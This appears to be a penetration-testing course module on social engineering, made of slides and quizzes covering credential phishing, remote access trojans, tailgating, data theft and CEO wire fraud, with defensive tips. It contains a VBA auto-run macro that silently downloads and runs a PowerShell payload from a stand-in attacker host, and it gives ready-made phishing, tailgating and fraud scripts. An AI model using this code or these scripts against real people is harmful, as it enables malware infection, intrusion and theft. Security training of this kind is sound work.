title: Common Goals & Payloads
description: What are we actually trying to steal or accomplish in the real world?

slides.title: The Endgame 🏁
slides.content:
# Why Are We Doing This?

In a penetration test, Social Engineering is just the **Initial Access Vector**. The end goal is usually further down the kill chain.

| Goal | Description | Social Engineering Tactic |
| :--- | :--- | :--- |
| **Credentials** | Username & Password | Phishing Link, Vishing Help Desk |
| **Remote Access** | Malware Install (RAT) | Malicious Macro in 'Invoice.doc' |
| **Physical Access** | Getting inside the building | Tailgating, Fake Fire Inspection |
| **Data Exfil** | Stealing files | Convincing user to email file to 'personal account' |
| **Financial** | Money Transfer | CEO Fraud / BEC Scam |

slides.title: Goal 1: Credential Harvesting 📝
slides.content:
## The Most Common Ask

**Why it's powerful:** People reuse passwords. Their LinkedIn password is often their Corporate VPN password.

**Technique:**
1.  Send email: "Your Office 365 password expires in 2 hours. **Keep Same Password** [Link]."
2.  Link goes to a clone of the Office 365 login page.
3.  User types password. Page shows 'Success! Password Extended.'
4.  Attacker now has **Valid Credentials**.

quizData.question: You are on a Red Team. Your goal is to demonstrate the risk of data leakage. Which Social Engineering goal aligns with this?

options.text: Tricking HR into emailing you the employee W-2 forms (Data Exfil)

quizData.explanation: Correct. W-2 forms are highly sensitive PII. Getting them emailed externally is a classic data exfiltration test.

slides.title: Goal 2: Remote Access Trojan (RAT) 🐀
slides.content: Getting the user to run our code.
slides.codeSnippet:
Sub AutoOpen()
    ' This is VBA Macro Malware
    Dim strCmd As String
    strCmd = "powershell -NoP -C IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"
    Shell strCmd, vbHide
End Sub

slides.title: Goal 3: Physical Access 🏢
slides.content:
## The Clip Board Method

This is the **king** of physical Social Engineering.

1.  **Prop:** Wear a hard hat or carry a clipboard with a fake 'Service Ticket' printout.
2.  **Approach:** Wait at a secure door smoking a cigarette (or pretending to vape).
3.  **Action:** When an employee badges in, look frustrated and pat your pockets.
4.  **Phrase:** *"Dammit, left my badge in the truck. Mind grabbing the door? My hands are full."*
5.  **Success Rate:** > 90%.

slides.title: Goal 4: Business Email Compromise (BEC) 💰
slides.content:
## The $26 Billion Scam

**The Setup:** Attacker spoofs the **CEO's** email address.
**The Target:** The **CFO** or **Accounts Payable** clerk.
**The Message:** *"Hey, we're closing the Acme deal today. Need you to wire $45k to this escrow account urgently. I'm in a meeting, can't talk. Confirm when done."*

**Why it works:** Power Distance. The clerk is scared to question the CEO. They rush to get it done to please the boss.

**Red Flag:** Urgency + Secrecy + New Banking Info = **SCAM**.

quizData.question: What is the SINGLE most effective control against a CEO Fraud/BEC wire transfer scam?

options.text: Out-of-Band Verification (Call the CEO on a known number)

quizData.explanation: Correct. Out-of-Band means using a different communication channel. If the email asks for a wire, PICK UP THE PHONE and call the person using the number in your contacts app, not the number in the email.
